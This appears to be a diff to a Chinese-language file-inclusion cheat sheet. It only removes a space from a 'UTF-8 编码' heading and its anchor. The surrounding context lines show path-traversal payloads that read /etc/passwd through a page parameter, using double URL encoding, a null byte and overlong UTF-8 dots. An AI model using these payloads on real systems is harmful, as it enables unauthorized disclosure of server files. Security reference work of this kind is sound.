@@ -10,7 +10,7 @@
 * [基本的本地文件包含](#基本的本地文件包含)
     * [Null字节](#null-字节)
     * [双重编码](#双重编码)
-    * [UTF-8 编码](#UTF-8 编码)
+    * [UTF-8编码](#UTF-8编码)
     * [路径与.截断](#路径与.截断)
     * [filter绕过技巧](#filter绕过技巧)
 * [Basic RFI](#basic-rfi)
@@ -59,7 +59,7 @@ http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
 http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
 ```
 
-### UTF-8 编码
+### UTF-8编码
 
 ```powershell
 http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
